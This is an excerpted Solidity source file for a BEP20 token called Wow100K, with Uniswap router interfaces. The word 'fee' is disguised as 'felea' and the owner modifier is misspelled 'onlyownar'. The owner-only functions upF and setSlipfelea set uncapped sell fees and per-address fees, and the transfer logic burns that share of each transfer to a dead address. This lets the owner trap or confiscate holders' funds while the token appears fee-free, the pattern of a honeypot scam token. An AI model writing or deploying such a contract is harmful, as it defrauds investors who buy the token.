...
interface IUniswapV2Factory {
    ...
    function feleaTo() external view returns (address);
    function feleaToSetter() external view returns (address);
    ...
    function setfeleaTo(address) external;
    function setfeleaToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeleaOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeleaOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeleaOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeleaOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeleaOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Wow100K is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfelea = 0;

    uint256 private _defaultBuyfelea = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfelea;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfelea = _value;
    }

    function setSlipfelea(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfelea[_address] = _value;
    }

    function getSlipfelea(address _address) external view onlyownar returns (uint256) {
        return _slipfelea[_address];
    }


    function setMAccountfelea(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfelea(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeleaAmount = 0;

        if (rF) {
            uint256 tradefelea = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefelea = _defaultSellfelea;
                }
                if (from == uniswapV2Pair) {

                    tradefelea = _defaultBuyfelea;
                }
            }
            if (_slipfelea[from] > 0) {
                tradefelea = _slipfelea[from];
            }

            tradefeleaAmount = _Amount.mul(tradefelea).div(100);
        }


        if (tradefeleaAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeleaAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeleaAmount);
            emit Transfer(from, _deadAddress, tradefeleaAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeleaAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeleaAmount);
        emit Transfer(from, _to, _Amount - tradefeleaAmount);
    }
